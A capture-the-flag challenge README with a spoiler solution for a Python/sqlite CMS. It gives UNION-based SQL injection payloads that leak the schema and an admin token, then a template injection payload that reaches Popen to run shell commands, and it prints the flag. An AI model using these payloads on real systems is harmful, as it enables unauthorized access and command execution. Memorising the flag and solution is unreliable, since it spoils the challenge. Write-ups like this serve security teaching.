# Content Mangling System

## Authors
* todo

## Category
* Web

## Tags
* SQLI

## Description
Ever wanted to have WordPress but less bloated? I've made a new, secure, and lightweight CMS solution based on sqlite.
In just 80 lines of python we are able to do 1% of what WordPress can, and whats more, we have no php!

## Difficulty
* medium

## Points
100

## Hints
N/A

## Files
* solve.py
* src: Challenge Source

## Setup
* Run docker build
* Ensure that a network firewall prevent access to AT LEAST the metadata endpoint is present

## Solution
<details>
<summary>spoiler</summary>

_Code can be found in `solve.py`_

### Description
In this challenge we utilize a sql injection in order to retrieve a admin token. Using the admin token we then create a new page containing a template injection payload.

### Sql Injection
We notice the presence of a sql injection vulnerability in the url. For instance, navigating to `/'` results in a Internal Server Error. We aim to exploit this to leak the database schema, followed by any secrets.

#### Table Schema
After playing around we arrive at a payload that looks like
```
/nonexistant' UNION SELECT sql,'a','b' FROM sqlite_master LIMIT 1 OFFSET 1 --
```

However submitting this, we still get asked for a token. It's reasonable to assume that the token must also be fetched from the database and that we should try out one of our dummy values as the token. In this case sending the following leaks the schema of the `pages` table.
```
/nonexistant' UNION SELECT sql,'a','b' FROM sqlite_master LIMIT 1 OFFSET 1 -- ?token=b

CREATE TABLE pages ( id INT PRIMARY KEY, route TEXT UNIQUE NOT NULL, title TEXT NOT NULL, template TEXT NOT NULL, auth TEXT )
```

Less intuitively setting `'b'` to `NULL` also works, as this is how the system detects non-authorized pages. This isn't nesseary for a solve, but we will use this for the rest of the explanation as its shorter to write.
```
/nonexistant' UNION SELECT sql,'a',NULL FROM sqlite_master LIMIT 1 OFFSET 1 --
```

#### Token leak
We can then use a similar payload to above to leak the token. The route can be trivially found on the main page.
```
/nonexistant' UNION SELECT auth,'a',NULL FROM pages WHERE route='admin' --
```

### Template injection
Using this token to access the admin page gives us access to page creation. Using this we create a page with a template injection payload on it
```
{{ "".__class__.__mro__[1].__subclasses__() }}
```

Navigating to this page executes the payload and returns a list of loaded classes on the page.

We look for the `gevent.subprocess.Popen` class (or really any class of your choice) as we can use to to execute shell commands.

We create a new page with a reference to the `Popen` class, and pass it a shell command `cat /flag`. This will get us the flag.
```
    'template': '{{ "".__class__.__mro__[1].__subclasses__()[<index of Popen>](<Shell>, stdout=-1).stdout.read().decode() }}',

```

### Flag
`ATLASSIAN{Pr0b4blY_st1LL_BEtt3r_tH4n_m0odLE}`
</details>
